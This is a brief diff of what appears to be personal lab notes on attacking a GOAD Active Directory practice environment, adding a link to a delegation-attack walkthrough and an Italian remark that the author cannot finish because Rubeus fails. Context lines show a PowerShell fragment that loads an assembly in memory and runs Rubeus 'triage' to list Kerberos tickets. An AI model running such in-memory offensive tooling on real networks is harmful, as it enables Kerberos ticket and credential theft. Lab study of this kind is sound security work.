@@ -17,3 +17,5 @@ $assem = [System.Reflection.Assembly]::Load($data);
 [Rubeus.Program]::MainString("triage");
 ```
 ![[Pasted image 20230911105711.png]]
+[GOAD - part 10 - Delegations | Mayfly (mayfly277.github.io)](https://mayfly277.github.io/posts/GOADv2-pwning-part10/)
+Il resto dell'attacco non posso farlo perchè non mi funziona rubeus
